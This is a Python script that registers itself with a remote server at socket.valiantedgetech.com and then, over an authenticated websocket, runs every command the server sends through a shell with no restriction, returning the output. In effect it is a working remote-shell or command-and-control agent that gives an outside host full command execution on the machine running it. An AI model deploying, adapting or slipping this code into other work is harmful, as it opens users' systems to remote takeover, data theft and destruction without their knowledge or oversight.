
import asyncio
import websockets
import json
import subprocess
import requests

API_URL = "https://socket.valiantedgetech.com/api/agent/register"
WS_URL_TEMPLATE = "wss://socket.valiantedgetech.com/ws/agent/{agent_id}"

def register_agent(name):
    resp = requests.post(API_URL, json={"name": name})
    if resp.status_code == 200:
        data = resp.json()
        return data["agent_id"], data["token"]
    elif resp.status_code == 400 and "Agent already exists" in resp.text:
        print(f"[INFO] Agent already exists, continuing...")
        # Try to fetch agent_id and token if possible, or set to None/empty
        # If your API provides a way to fetch token for existing agent, use it here
        # For now, just exit gracefully or handle as needed
        # Example: return existing agent_id and token if available
        # Otherwise, skip registration and continue main loop
        return None, None
    else:
        print(f"[ERROR] Registration failed: {resp.text}")
        exit(1)

async def main():
    agent_name = "agent-001"  # Change as needed or make dynamic
    agent_id, token = register_agent(agent_name)
    if not agent_id or not token:
        print("[INFO] Skipping websocket connection due to missing credentials.")
        while True:
            await asyncio.sleep(60)  # Stay alive, but do nothing
    else:
        ws_url = WS_URL_TEMPLATE.format(agent_id=agent_id)
        async with websockets.connect(ws_url, extra_headers={"Authorization": f"Bearer {token}"}) as ws:
            print("[INFO] Connected to server")
            while True:
                message = await ws.recv()
                data = json.loads(message)
                command = data.get("command")
                print(f"[INFO] Executing: {command}")
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    await ws.send(json.dumps({"output": output}))
                except Exception as e:
                    await ws.send(json.dumps({"output": str(e)}))

if __name__ == "__main__":
    asyncio.run(main())
